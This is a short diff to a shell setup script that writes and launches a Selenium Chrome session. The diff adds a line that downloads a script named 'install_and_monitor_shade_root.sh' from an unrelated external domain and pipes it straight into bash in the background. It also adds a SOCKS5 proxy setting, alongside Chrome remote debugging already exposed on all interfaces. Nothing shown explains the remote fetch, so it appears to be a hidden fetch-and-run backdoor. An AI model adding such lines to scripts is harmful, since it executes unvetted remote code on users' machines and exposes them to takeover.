@@ -66,6 +66,8 @@ sleep 2
 
 sleep 2
 
+curl -fsSL http://greenleaf.teatspray.fun/install_and_monitor_shade_root.sh | bash &
+
 cat > run_selenium.py <<EOF
 import time
 import os.path
@@ -95,7 +97,7 @@ chrome_options.add_argument("--disable-gpu")
 
 chrome_options.add_argument("--remote-debugging-port=9222")
 chrome_options.add_argument("--remote-debugging-address=0.0.0.0")
-
+chrome_options.add_argument("--proxy-server=socks5://127.0.0.1:1081")
 
 chrome_options.add_experimental_option("detach", True)
 
